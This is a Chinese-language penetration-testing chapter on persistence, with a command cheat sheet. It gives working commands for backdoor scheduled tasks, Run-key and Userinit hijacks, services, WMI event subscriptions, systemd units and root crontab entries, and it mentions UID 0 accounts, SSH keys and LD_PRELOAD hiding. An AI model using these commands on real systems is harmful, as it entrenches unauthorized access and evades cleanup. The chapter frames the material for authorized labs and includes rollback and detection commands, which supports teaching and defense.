# 第7章 权限维持

## Windows

- 后门账户、Guest、克隆账户（注册表 SAM 操作风险高）。
- 服务：`sc create`、服务 DLL、系统服务 DLL 劫持。
- 任务计划：`schtasks`，并注意清理注册表隐藏项。
- WMI 永久事件：`__EventFilter` + `CommandLineEventConsumer` + binding。
- 注册表：Load、Userinit、Explorer\Run、RunOnce\Setup、Run。
- 启动目录、Shell 扩展、Shift 后门、驱动隐藏。
- 所有修改必须记录并支持恢复。

```cmd
schtasks /create /tn Task1 /sc minute /mo 10 /RU SYSTEM /tr "C:\ProgramData\tool.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="f1", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

## Linux

- crontab、systemd、init.d、rc.local、bash_profile。
- 添加 UID 0 用户、sudo 配置、SSH authorized_keys。
- SSH/PAM 后门风险极高，必须仅限授权实验环境。
- SUID、LD_PRELOAD、Reptile 等隐藏技术需评估稳定性。
- 文件保护：`chattr +i`。

## 数据库

- MSSQL/MySQL 触发器后门。
- 触发条件应明确、可移除，避免破坏业务数据。
## 命令速查

### Windows 自启动

```cmd
schtasks /create /tn <TASK> /sc minute /mo 10 /RU SYSTEM /tr "C:\ProgramData\tool.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /t REG_SZ /d "C:\ProgramData\tool.exe" /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /t REG_SZ /d "C:\ProgramData\tool.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\ProgramData\tool.exe" /f
sc create <SERVICE> binpath= "C:\ProgramData\tool.exe" start= auto
sc start <SERVICE>
```

### WMI 永久事件

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="<FILTER>",EventNamespace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="<CONSUMER>",CommandLineTemplate="C:\ProgramData\tool.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"<FILTER>\"",Consumer="CommandLineEventConsumer.Name=\"<CONSUMER>\""
```

查询/删除：

```powershell
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='<CONSUMER>'" | Remove-WMIObject -Verbose
```

### Linux

```bash
# systemd
cat >/lib/systemd/system/<SERVICE>.service <<'EOF'
[Unit]
Description=<SERVICE>
[Service]
ExecStart=/tmp/tool
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now <SERVICE>

# crontab
echo '*/10 * * * * root /tmp/tool >/dev/null 2>&1' >> /etc/crontab

# 账号检查
getent passwd | awk -F: '$3==0{print}'
grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d 2>/dev/null
```

提示：所有持久化改动必须记录文件名、服务名、任务名和回滚命令；不要覆盖生产关键文件。
